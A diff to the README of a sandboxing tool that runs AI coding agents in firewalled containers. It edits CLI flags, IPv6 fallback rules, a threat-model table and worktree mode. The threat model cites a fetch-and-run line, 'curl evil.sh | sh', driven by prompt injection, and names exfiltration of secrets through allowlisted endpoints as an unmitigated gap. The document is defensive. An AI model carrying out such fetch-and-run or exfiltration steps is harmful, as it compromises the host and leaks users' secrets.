@@ -35,13 +35,13 @@ uv run project-sandbox --help
 ## Quick start
 
 ```bash
-uv run project-sandbox --agent both /absolute/path/to/repo python:3.12-slim
+uv run project-sandbox /absolute/path/to/repo python:3.12-slim
 ```
 
 Use `--dry-run` to preview every action without writing files or starting the runtime:
 
 ```bash
-uv run project-sandbox --dry-run --agent both /absolute/path/to/repo python:3.12-slim
+uv run project-sandbox --dry-run /absolute/path/to/repo python:3.12-slim
 ```
 
 ## File layout
@@ -88,7 +88,6 @@ Run the agent without a TTY, starting from a prompt and writing all output to a 
 
 ```bash
 uv run project-sandbox \
-  --agent claude \
   --prompt /absolute/path/to/prompt.txt \
   /absolute/path/to/repo \
   python:3.12-slim
@@ -112,12 +111,11 @@ When the firewall is enabled (default), `init-firewall.sh` runs as root inside t
 - Pins DNS to the resolver(s) in `/etc/resolv.conf` only (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
 - Allows GitHub's published IP ranges (fetched from `api.github.com/meta`), `registry.npmjs.org`, `api.anthropic.com`, `api.openai.com`, and sentry.
 - Allows the host gateway subnet so port-forwarding and IDE attach work.
-- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable. `--no-ipv6-firewall` accepts that fallback even when `sysctl` also fails (use sparingly).
+- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable — the script exits with an error if both `ip6tables` and `sysctl` are unavailable.
 
 Customize:
 
 - `--extra-domain DOMAIN` — append entries to the allowlist (private npm registries, internal APIs, etc.). Repeatable.
-- `--firewall-allow-openai` — explicitly allow `api.openai.com` even when Codex is not installed.
 - `--no-firewall` — skip the firewall entirely (trusted-LAN debugging only).
 
 ## Threat model
@@ -131,28 +129,29 @@ Customize:
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as UID 1000 inside the VM; no host access. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
+| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` (Claude); `analytics.enabled = false` and `feedback.enabled = false` (Codex). |
 | API token leakage to other host processes | The token lives inside the VM, not in the macOS Keychain. |
 
 The tool does **not** protect against:
 
 - Exfiltration via whitelisted endpoints (e.g. committing secrets to a GitHub repo).
 - Misuse of an agent's own API token (it is by definition available to the agent).
-- IPv6 egress when `ip6_tables` is unavailable, `sysctl` cannot disable IPv6, **and** `--no-ipv6-firewall` is set.
+- IPv6 egress when `ip6_tables` is unavailable and `sysctl` cannot disable IPv6 (the firewall script exits with an error in that case rather than silently proceeding).
 
 ## Troubleshooting
 
 - **`container system start` failed.** Make sure macOS 15+ is current and `apple/container` is installed; the tool calls `container system start` idempotently before building.
 - **Build OOM.** The builder VM is separate from run VMs. Bump it: `container builder start --memory 8g --cpus 8`, then re-run with `--rebuild`.
 - **GitHub meta API timeout.** The firewall script falls back to an empty `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the agent later (with the firewall flushed and rebuilt at container start) will retry.
-- **`ip6tables` unavailable.** The script attempts `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that fails too, the script aborts unless `--no-ipv6-firewall` is set.
-- **Credentials look stale.** With `--credentials-mode ro`, refresh tokens cannot be written back; use the default `rw` for long-running setups.
+- **`ip6tables` unavailable.** The script attempts `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script aborts with an error.
+- **Credentials look stale.** Credential files are bind-mounted into the container; refreshing tokens inside a container writes them back to the host credential file automatically.
 - **Env vars in `vminitd.log`.** apple/container [logs the full process environment](https://github.com/apple/container/discussions/1153). Tokens are passed through mounted credential files only; identity env vars are low-sensitivity.
 
 ## Limitations
 
 - Base images must be Debian or Ubuntu based — the firewall depends on `apt` packages including `aggregate`, which Alpine does not ship.
 - Apple `container` is required to run the launchers. The generated `.devcontainer/` works with any Docker-compatible runtime (Docker Desktop, OrbStack, Codespaces).
-- `--branch` (worktree mode) is reserved for a future release. The CLI accepts the flag and exits with an explanation; the same workflow can be approximated today by running the tool against an externally-managed worktree path.
+- `--branch` (worktree mode) creates a git worktree on the given branch (creating it if it doesn't exist), mounts the worktree at `/workspace`, and bind-mounts the main repo's `.git/` so `git` works correctly inside the container. After the session, `--after-session` controls whether to merge, rebase, open a PR, or do nothing. Note: jj repos and worktree-of-worktree setups are not yet supported.
 - `jj` is installed in the container for users who want to shell in and use it, but the tool itself does not write any jj configuration. Configure jj inside the container yourself if you need it.
 
 ## Development
